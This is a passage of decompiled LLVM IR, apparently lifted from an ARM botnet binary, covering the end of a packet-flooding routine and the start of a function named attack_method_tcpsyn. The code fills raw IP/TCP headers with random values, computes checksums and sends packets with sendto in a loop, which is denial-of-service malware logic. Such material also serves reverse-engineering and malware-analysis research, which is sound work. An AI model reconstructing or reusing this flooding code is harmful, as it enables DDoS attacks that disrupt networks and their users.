  %v1_bf30 = trunc i32 %v0_bf30 to i16
  store i32 %v0_bf30, i32* %r0.global-to-local, align 4
  store i32 %v1_bde4, i32* %r2.global-to-local, align 4
  store i1 %v2_bf38, i1* %cpsr_z.global-to-local, align 1
  %v3_bf44.pre = load i32, i32* @r4, align 4
  br i1 %v2_bf38, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_bf3c = add i32 %v3_bf44.pre, 13
  %v3_bf3c = inttoptr i32 %v2_bf3c to i8*
  %v4_bf3c = load i8, i8* %v3_bf3c, align 1
  %v5_bf3c = zext i8 %v4_bf3c to i32
  %v2_bf40 = or i32 %v5_bf3c, 8
  store i32 %v2_bf40, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bf44 = add i32 %v3_bf44.pre, 14
  %v5_bf44 = inttoptr i32 %v4_bf44 to i16*
  store i16 %v1_bf30, i16* %v5_bf44, align 2
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v0_bf4c = load i32, i32* @r5, align 4
  %v1_bf4c = add i32 %v0_bf4c, 40
  store i32 %v1_bf4c, i32* %r0.global-to-local, align 4
  br i1 %v2_bf38, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bf50 = load i32, i32* @r3, align 4
  %v2_bf50 = trunc i32 %v1_bf50 to i8
  %v3_bf50 = load i32, i32* @r4, align 4
  %v4_bf50 = add i32 %v3_bf50, 13
  %v5_bf50 = inttoptr i32 %v4_bf50 to i8*
  store i8 %v2_bf50, i8* %v5_bf50, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bf54 = inttoptr i32 %v1_bf4c to i16*
  %v3_bf54 = call i32 @rand_str(i16* %v2_bf54, i32 %v6_bc94)
  store i32 %v3_bf54, i32* %r0.global-to-local, align 4
  %v3_bf58 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bf58, i32* %r3.global-to-local, align 4
  %v1_bf5c = add i32 %v3_bf58, 1
  store i32 %v1_bf5c, i32* @r4, align 4
  %v1_bf60 = load i32, i32* @r7, align 4
  %v9_bf60 = icmp eq i32 %v1_bf5c, %v1_bf60
  store i1 %v9_bf60, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf5c, i32* %stack_var_-44, align 4
  %v5_bf68 = icmp slt i32 %v1_bf5c, %v1_bf60
  br i1 %v5_bf68, label %dec_label_pc_be04, label %dec_label_pc_bf6c

dec_label_pc_bf6c:                                ; preds = %bb70
  store i32 %v6_bc94, i32* %r3.global-to-local, align 4
  %v1_bf70 = add i32 %v6_bc94, 20
  store i32 %v1_bf70, i32* @sb, align 4
  br label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_c1bc, %dec_label_pc_bf6c
  %v0_bf908 = phi i32 [ %v1_bf60, %dec_label_pc_bf6c ], [ 0, %dec_label_pc_c1bc ]
  %stack_var_-140.0 = phi i32 [ %v3_bd54, %dec_label_pc_bf6c ], [ %v3_c1c8, %dec_label_pc_c1bc ]
  %storemerge = add i32 %v6_bc94, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf7c = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf7c, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf7c, 256
  %v3_bf84 = and i32 %tmp71, 65280
  store i32 %v3_bf84, i32* %r3.global-to-local, align 4
  %v4_bf88 = udiv i32 %v1_bf7c, 16777216
  %v5_bf88 = or i32 %v3_bf84, %v4_bf88
  store i32 %v5_bf88, i32* @sl, align 4
  %v3_c128 = icmp eq i32 %v3_bd2c, 65535
  %v2_c18c = icmp eq i32 %v1_bcbc, 0
  %v2_bfc8 = icmp eq i32 %v6_bcd0, -1
  %v7_bfc8 = icmp eq i32 %v6_bcd0, -1
  br label %dec_label_pc_bf8c

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4, %dec_label_pc_bf78
  %v0_bf90 = phi i32 [ %v0_bf908, %dec_label_pc_bf78 ], [ 0, %dec_label_pc_c0a4 ], [ 0, %dec_label_pc_bf8c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf90 = icmp eq i32 %v0_bf90, 0
  store i1 %v2_bf90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf90, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_bf8c, %dec_label_pc_c0a4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bfa0

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_c020, %dec_label_pc_bf9c
  %v1_bfb4 = phi i32 [ %v1_c094, %dec_label_pc_c020 ], [ 0, %dec_label_pc_bf9c ]
  %v5_bfa4 = mul i32 %v1_bfb4, 24
  %v1_bfa8 = load i32, i32* @r8, align 4
  %v2_bfa8 = add i32 %v1_bfa8, %v5_bfa4
  store i32 %v2_bfa8, i32* %r3.global-to-local, align 4
  store i32 %v2_bb00, i32* %ip.global-to-local, align 4
  %v1_bfb0 = add i32 %v2_bfa8, 20
  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i8*
  %v3_bfb0 = load i8, i8* %v2_bfb0, align 1
  %v4_bfb0 = zext i8 %v3_bfb0 to i32
  store i32 %v4_bfb0, i32* %r2.global-to-local, align 4
  %v4_bfb4 = mul i32 %v1_bfb4, 4
  %v5_bfb4 = add i32 %v4_bfb4, %v2_bb00
  %v6_bfb4 = inttoptr i32 %v5_bfb4 to i32*
  %v7_bfb4 = load i32, i32* %v6_bfb4, align 4
  store i32 %v7_bfb4, i32* @r5, align 4
  %v7_bfb8 = icmp eq i8 %v3_bfb0, 31
  store i1 %v7_bfb8, i1* %cpsr_z.global-to-local, align 1
  %v1_bfbc = add i32 %v7_bfb4, 20
  store i32 %v1_bfbc, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bfb0, 32
  br i1 %tmp77, label %dec_label_pc_c0b8, label %dec_label_pc_bfc4

dec_label_pc_bfc4:                                ; preds = %dec_label_pc_bfa0
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_bfe4

dec_label_pc_bfe4:                                ; preds = %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge, %dec_label_pc_bfd0
  %v1_bfe8 = phi i32 [ %v1_bfe8.pre, %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge ], [ 65535, %dec_label_pc_bfd0 ]
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v9_bfe8 = icmp eq i32 %v3_bd30, %v1_bfe8
  store i1 %v9_bfe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfe8, label %dec_label_pc_c148, label %dec_label_pc_bff0

dec_label_pc_bff0:                                ; preds = %dec_label_pc_c134.dec_label_pc_bff0_crit_edge, %dec_label_pc_bfe4
  %v1_bff4 = phi i32 [ %v1_bff4.pre, %dec_label_pc_c134.dec_label_pc_bff0_crit_edge ], [ %v1_bfe8, %dec_label_pc_bfe4 ]
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v9_bff4 = icmp eq i32 %v3_bd34, %v1_bff4
  store i1 %v9_bff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bff4, label %dec_label_pc_c15c, label %dec_label_pc_bffc

dec_label_pc_bffc:                                ; preds = %dec_label_pc_c148.dec_label_pc_bffc_crit_edge, %dec_label_pc_bff0
  %v1_c000 = phi i32 [ %v1_c000.pre, %dec_label_pc_c148.dec_label_pc_bffc_crit_edge ], [ %v1_bff4, %dec_label_pc_bff0 ]
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v9_c000 = icmp eq i32 %v5_bbd0, %v1_c000
  store i1 %v9_c000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c000, label %dec_label_pc_c170, label %dec_label_pc_c008

dec_label_pc_c008:                                ; preds = %dec_label_pc_c15c.dec_label_pc_c008_crit_edge, %dec_label_pc_bffc
  %v1_c00c = phi i32 [ %v1_c00c.pre, %dec_label_pc_c15c.dec_label_pc_c008_crit_edge ], [ %v1_c000, %dec_label_pc_bffc ]
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v9_c00c = icmp eq i32 %v6_bbec, %v1_c00c
  store i1 %v9_c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c00c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c014:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c020:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184, %dec_label_pc_c198
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_c024 = load i32, i32* @r5, align 4
  %v3_c024 = add i32 %v2_c024, 10
  %v4_c024 = inttoptr i32 %v3_c024 to i16*
  store i16 0, i16* %v4_c024, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_c02c = load i32, i32* @r5, align 4
  store i32 %v0_c02c, i32* @r0, align 4
  %v2_c030 = call i32 @checksum_generic(i32 %v0_c02c, i32 20)
  %v3_c030 = trunc i32 %v2_c030 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c038 = load i32, i32* @r5, align 4
  %v4_c038 = add i32 %v3_c038, 10
  %v5_c038 = inttoptr i32 %v4_c038 to i16*
  store i16 %v3_c030, i16* %v5_c038, align 2
  %v0_c03c = load i32, i32* @r6, align 4
  store i32 %v0_c03c, i32* @r1, align 4
  %v0_c040 = load i32, i32* %r3.global-to-local, align 4
  %v1_c040 = trunc i32 %v0_c040 to i16
  %v3_c040 = add i32 %v0_c03c, 16
  %v4_c040 = inttoptr i32 %v3_c040 to i16*
  store i16 %v1_c040, i16* %v4_c040, align 2
  %v0_c044 = load i32, i32* @sl, align 4
  store i32 %v0_c044, i32* %r2.global-to-local, align 4
  %v0_c048 = load i32, i32* @sb, align 4
  store i32 %v0_c048, i32* %r3.global-to-local, align 4
  %v0_c04c = load i32, i32* @r5, align 4
  store i32 %v0_c04c, i32* %r0.global-to-local, align 4
  %v4_c050 = call i32 @checksum_tcpudp(i32 %v0_c04c, i32 %v0_c03c, i32 %v0_c044, i32 %v0_c048)
  %v5_c050 = trunc i32 %v4_c050 to i16
  store i32 %v4_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c054, i32* %r3.global-to-local, align 4
  %v3_c058 = mul i32 %v3_c054, 32
  store i32 %v3_c058, i32* %lr.global-to-local, align 4
  %v3_c05c = load i32, i32* @r6, align 4
  %v4_c05c = add i32 %v3_c05c, 16
  %v5_c05c = inttoptr i32 %v4_c05c to i16*
  store i16 %v5_c050, i16* %v5_c05c, align 2
  %v0_c060 = load i32, i32* %lr.global-to-local, align 4
  %v1_c060 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_c060, -8
  %v5_c060 = add i32 %v0_c060, %tmp78
  store i32 %v5_c060, i32* %lr.global-to-local, align 4
  %v0_c064 = load i32, i32* @r6, align 4
  %v1_c064 = add i32 %v0_c064, 2
  %v2_c064 = inttoptr i32 %v1_c064 to i16*
  %v3_c064 = load i16, i16* %v2_c064, align 2
  %v4_c064 = zext i16 %v3_c064 to i32
  store i32 %v4_c064, i32* @r6, align 4
  %v1_c068 = load i32, i32* @r8, align 4
  %v2_c068 = add i32 %v1_c068, %v5_c060
  store i32 %v2_c068, i32* @lr, align 4
  %v3_c06c = add i32 %v2_c068, 2
  %v4_c06c = inttoptr i32 %v3_c06c to i16*
  store i16 %v3_c064, i16* %v4_c06c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c078 = load i32, i32* @r5, align 4
  store i32 %v0_c078, i32* %r1.global-to-local, align 4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v0_c080 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c080, i32* %r2.global-to-local, align 4
  %v0_c084 = load i32, i32* @lr, align 4
  %v6_c08c = call i32 @__libc_sendto(i32 %v3_bce4, i32 %v0_c078, i32 %v0_c080, i32 16384, i32 %v0_c084, i32 16)
  %v3_c090 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c090, i32* %r3.global-to-local, align 4
  %v1_c094 = add i32 %v3_c090, 1
  store i32 %v1_c094, i32* %r0.global-to-local, align 4
  %v1_c098 = load i32, i32* @r7, align 4
  %v9_c098 = icmp eq i32 %v1_c094, %v1_c098
  store i1 %v9_c098, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c094, i32* %stack_var_-44, align 4
  %v5_c0a0 = icmp slt i32 %v1_c094, %v1_c098
  br i1 %v5_c0a0, label %dec_label_pc_bfa0, label %dec_label_pc_c0a4

dec_label_pc_c0a4:                                ; preds = %dec_label_pc_c020
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c0a8 = icmp eq i32 %v1_c098, 0
  store i1 %v2_c0a8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c0a8, label %dec_label_pc_bf8c, label %dec_label_pc_bf9c

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_bfa0
  %v1_c0b8 = add i32 %v2_bfa8, 16
  %v2_c0b8 = inttoptr i32 %v1_c0b8 to i32*
  %v3_c0b8 = load i32, i32* %v2_c0b8, align 4
  %v0_c0bc = call i32 @rand_next()
  store i32 %v0_c0bc, i32* %r0.global-to-local, align 4
  %v3_c0c0 = load i32, i32* %stack_var_-44, align 4
  %v5_c0c8 = mul i32 %v3_c0c0, 24
  %v1_c0cc = and i32 %v3_c0b8, 16711680
  store i32 %v1_c0cc, i32* %ip.global-to-local, align 4
  %v3_c0d0 = udiv i32 %v3_c0b8, 16777216
  %v4_c0d4 = udiv i32 %v1_c0cc, 256
  %v5_c0d4 = or i32 %v4_c0d4, %v3_c0d0
  store i32 %v5_c0d4, i32* %r2.global-to-local, align 4
  %v1_c0d8 = load i32, i32* @r8, align 4
  %v2_c0d8 = add i32 %v1_c0d8, %v5_c0c8
  store i32 %v2_c0d8, i32* %r1.global-to-local, align 4
  %v1_c0dc = and i32 %v3_c0b8, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_c0dc, i32* %r3.global-to-local, align 4
  %v1_c0e0 = add i32 %v2_c0d8, 20
  %v2_c0e0 = inttoptr i32 %v1_c0e0 to i8*
  %v3_c0e0 = load i8, i8* %v2_c0e0, align 1
  %v4_c0e0 = zext i8 %v3_c0e0 to i32
  store i32 %v4_c0e0, i32* %ip.global-to-local, align 4
  %v4_c0e4 = mul i32 %v1_c0dc, 256
  %v4_c0e8 = mul i32 %v3_c0b8, 16777216
  %v5_c0e4 = or i32 %v4_c0e4, %v4_c0e8
  %v5_c0e8 = or i32 %v5_c0e4, %v5_c0d4
  %v7_c0ec = lshr i32 %v0_c0bc, %v4_c0e0
  %v8_c0ec = add i32 %v7_c0ec, %v5_c0e8
  store i32 %v8_c0ec, i32* %r2.global-to-local, align 4
  %v1_c0fc = and i32 %v8_c0ec, 65280
  store i32 %v1_c0fc, i32* %r1.global-to-local, align 4
  store i32 %v6_bcd0, i32* %r0.global-to-local, align 4
  %v5_c108 = call i32 @llvm.bswap.i32(i32 %v8_c0ec)
  store i32 %v5_c108, i32* %r3.global-to-local, align 4
  store i1 %v7_bfc8, i1* %cpsr_z.global-to-local, align 1
  %v1_c110 = load i32, i32* @r5, align 4
  %v2_c110 = add i32 %v1_c110, 16
  %v3_c110 = inttoptr i32 %v2_c110 to i32*
  store i32 %v5_c108, i32* %v3_c110, align 4
  br i1 %v2_bfc8, label %dec_label_pc_c118, label %dec_label_pc_bfd0

dec_label_pc_c118:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_bfc4
  %v0_c118 = call i32 @rand_next()
  store i32 %v0_c118, i32* %r0.global-to-local, align 4
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c128, i1* %cpsr_z.global-to-local, align 1
  %v1_c12c = load i32, i32* @r5, align 4
  %v2_c12c = add i32 %v1_c12c, 12
  %v3_c12c = inttoptr i32 %v2_c12c to i32*
  store i32 %v0_c118, i32* %v3_c12c, align 4
  br i1 %v3_c128, label %dec_label_pc_c134, label %dec_label_pc_c118.dec_label_pc_bfe4_crit_edge

dec_label_pc_c118.dec_label_pc_bfe4_crit_edge:    ; preds = %dec_label_pc_c118
  %v1_bfe8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bfe4

dec_label_pc_c134:                                ; preds = %dec_label_pc_c118, %dec_label_pc_bfd0
  %v0_c134 = call i32 @rand_next()
  %v1_c134 = trunc i32 %v0_c134 to i16
  store i32 %v0_c134, i32* %r0.global-to-local, align 4
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v1_c13c = load i32, i32* @r4, align 4
  %v9_c13c = icmp eq i32 %v3_bd30, %v1_c13c
  store i1 %v9_c13c, i1* %cpsr_z.global-to-local, align 1
  %v3_c140 = load i32, i32* @r5, align 4
  %v4_c140 = add i32 %v3_c140, 4
  %v5_c140 = inttoptr i32 %v4_c140 to i16*
  store i16 %v1_c134, i16* %v5_c140, align 2
  br i1 %v9_c13c, label %dec_label_pc_c148, label %dec_label_pc_c134.dec_label_pc_bff0_crit_edge

dec_label_pc_c134.dec_label_pc_bff0_crit_edge:    ; preds = %dec_label_pc_c134
  %v1_bff4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bff0

dec_label_pc_c148:                                ; preds = %dec_label_pc_c134, %dec_label_pc_bfe4
  %v0_c148 = call i32 @rand_next()
  %v1_c148 = trunc i32 %v0_c148 to i16
  store i32 %v0_c148, i32* %r0.global-to-local, align 4
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v1_c150 = load i32, i32* @r4, align 4
  %v9_c150 = icmp eq i32 %v3_bd34, %v1_c150
  store i1 %v9_c150, i1* %cpsr_z.global-to-local, align 1
  %v3_c154 = load i32, i32* @r5, align 4
  %v4_c154 = add i32 %v3_c154, 20
  %v5_c154 = inttoptr i32 %v4_c154 to i16*
  store i16 %v1_c148, i16* %v5_c154, align 2
  br i1 %v9_c150, label %dec_label_pc_c15c, label %dec_label_pc_c148.dec_label_pc_bffc_crit_edge

dec_label_pc_c148.dec_label_pc_bffc_crit_edge:    ; preds = %dec_label_pc_c148
  %v1_c000.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bffc

dec_label_pc_c15c:                                ; preds = %dec_label_pc_c148, %dec_label_pc_bff0
  %v0_c15c = call i32 @rand_next()
  %v1_c15c = trunc i32 %v0_c15c to i16
  store i32 %v0_c15c, i32* %r0.global-to-local, align 4
  store i32 %v5_bbd0, i32* %ip.global-to-local, align 4
  %v1_c164 = load i32, i32* @r4, align 4
  %v9_c164 = icmp eq i32 %v5_bbd0, %v1_c164
  store i1 %v9_c164, i1* %cpsr_z.global-to-local, align 1
  %v3_c168 = load i32, i32* @r6, align 4
  %v4_c168 = add i32 %v3_c168, 2
  %v5_c168 = inttoptr i32 %v4_c168 to i16*
  store i16 %v1_c15c, i16* %v5_c168, align 2
  br i1 %v9_c164, label %dec_label_pc_c170, label %dec_label_pc_c15c.dec_label_pc_c008_crit_edge

dec_label_pc_c15c.dec_label_pc_c008_crit_edge:    ; preds = %dec_label_pc_c15c
  %v1_c00c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c008

dec_label_pc_c170:                                ; preds = %dec_label_pc_c15c, %dec_label_pc_bffc
  %v0_c170 = call i32 @rand_next()
  %v1_c174 = load i32, i32* @r6, align 4
  %v2_c174 = add i32 %v1_c174, 4
  %v3_c174 = inttoptr i32 %v2_c174 to i32*
  store i32 %v0_c170, i32* %v3_c174, align 4
  store i32 %v6_bbec, i32* %r0.global-to-local, align 4
  %v1_c17c = load i32, i32* @r4, align 4
  %v9_c17c = icmp eq i32 %v6_bbec, %v1_c17c
  store i1 %v9_c17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c17c, label %dec_label_pc_c184, label %dec_label_pc_c014

dec_label_pc_c184:                                ; preds = %dec_label_pc_c170, %dec_label_pc_c008
  %v0_c184 = call i32 @rand_next()
  store i32 %v0_c184, i32* %r0.global-to-local, align 4
  store i32 %v1_bcbc, i32* %r1.global-to-local, align 4
  store i1 %v2_c18c, i1* %cpsr_z.global-to-local, align 1
  %v1_c190 = load i32, i32* @r6, align 4
  %v2_c190 = add i32 %v1_c190, 8
  %v3_c190 = inttoptr i32 %v2_c190 to i32*
  store i32 %v0_c184, i32* %v3_c190, align 4
  br i1 %v2_c18c, label %dec_label_pc_c020, label %dec_label_pc_c198

dec_label_pc_c198:                                ; preds = %dec_label_pc_c014, %dec_label_pc_c184
  %v0_c198 = load i32, i32* @r5, align 4
  %v1_c198 = add i32 %v0_c198, 40
  store i32 %v1_c198, i32* %r0.global-to-local, align 4
  store i32 %v6_bc94, i32* %r1.global-to-local, align 4
  %v2_c1a0 = inttoptr i32 %v1_c198 to i16*
  %v3_c1a0 = call i32 @rand_str(i16* %v2_c1a0, i32 %v6_bc94)
  store i32 %v3_c1a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c020

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_bcf4
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v1_c1ac = call i32 @__GI___libc_close(i32 %v3_bce4)
  store i32 %v1_c1ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c1b0

dec_label_pc_c1b0:                                ; preds = %entry, %dec_label_pc_c1a8
  %v1_c1b8 = phi i32 [ %v3_bce4, %entry ], [ %v1_c1ac, %dec_label_pc_c1a8 ]
  store i32 %v18_bae4, i32* %sb.global-to-local, align 4
  store i32 %v24_bae4, i32* %fp.global-to-local, align 4
  store i32 %v27_bae4, i32* %lr.global-to-local, align 4
  ret i32 %v1_c1b8

dec_label_pc_c1bc:                                ; preds = %dec_label_pc_bd1c
  store i32 %v6_bc94, i32* %r0.global-to-local, align 4
  %v1_c1c4 = add i32 %v6_bc94, 20
  store i32 %v1_c1c4, i32* @sb, align 4
  %v3_c1c8 = mul i32 %v6_bc94, 65536
  store i32 %v3_c1c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bf78

; uselistorder directives
  uselistorder i32 %v0_c15c, { 1, 0 }
  uselistorder i32 %v0_c148, { 1, 0 }
  uselistorder i32 %v0_c134, { 1, 0 }
  uselistorder i32 %v5_c108, { 1, 0 }
  uselistorder i32 %v3_c0b8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_c094, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_c060, { 1, 0 }
  uselistorder i32 %v4_c050, { 1, 0 }
  uselistorder i1 %v7_bfc8, { 2, 1, 0 }
  uselistorder i1 %v2_c18c, { 2, 3, 1, 0 }
  uselistorder i1 %v3_c128, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_bf5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bf30, { 1, 0 }
  uselistorder i32 %v1_bde4, { 1, 2, 0 }
  uselistorder i32 %v1_bde0, { 2, 1, 0 }
  uselistorder i32 %v1_bddc, { 2, 0, 1 }
  uselistorder i32 %v1_bdd8, { 2, 0, 1 }
  uselistorder i32 %v1_bdd4, { 2, 0, 1 }
  uselistorder i32 %v1_bdac, { 1, 0 }
  uselistorder i32 %v3_bd54, { 1, 0 }
  uselistorder i32 %v3_bd2c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_bd24, { 1, 0, 2 }
  uselistorder i32 %v0_bd20, { 1, 0, 2 }
  uselistorder i32 %v0_bd1c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_bd14, { 1, 0 }
  uselistorder i1 %v7_bce8, { 1, 0 }
  uselistorder i32 %v3_bce4, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_bcd0, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_bcbc, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_bc94, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v6_bbec, { 3, 2, 1, 0 }
  uselistorder i32 %v5_bbd0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_bb80, { 1, 0 }
  uselistorder i32 %v2_bb00, { 0, 4, 1, 3, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i16 64, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c1b0, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bf9c, { 1, 0 }
  uselistorder label %dec_label_pc_bf8c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_method_tcpsyn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_c1dc = load i32, i32* @r4, align 4
  %v24_c1dc = load i32, i32* @fp, align 4
  %v27_c1dc = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c1f8 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_c1fc = load i32, i32* @r5, align 4
  store i32 %v0_c1fc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c1f8, i32* @sb, align 4
  %v0_c20c = load i32, i32* @r4, align 4
  store i32 %v0_c20c, i32* %r0.global-to-local, align 4
  %v4_c210 = inttoptr i32 %v0_c1fc to i32*
  %v5_c210 = call i32 @attack_get_opt_int(i32 %v0_c20c, i32* %v4_c210, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_c228 = load i32, i32* @r5, align 4
  store i32 %v0_c228, i32* %r1.global-to-local, align 4
  %v0_c22c = load i32, i32* @r4, align 4
  store i32 %v0_c22c, i32* %r0.global-to-local, align 4
  %v5_c230 = trunc i32 %v5_c210 to i8
  %v6_c234 = inttoptr i32 %v0_c228 to i32*
  %v7_c234 = call i32 @attack_get_opt_int(i32 %v0_c22c, i32* %v6_c234, i32 3, i32 65535)
  %v0_c238 = load i32, i32* @r5, align 4
  store i32 %v0_c238, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_c248 = load i32, i32* @r4, align 4
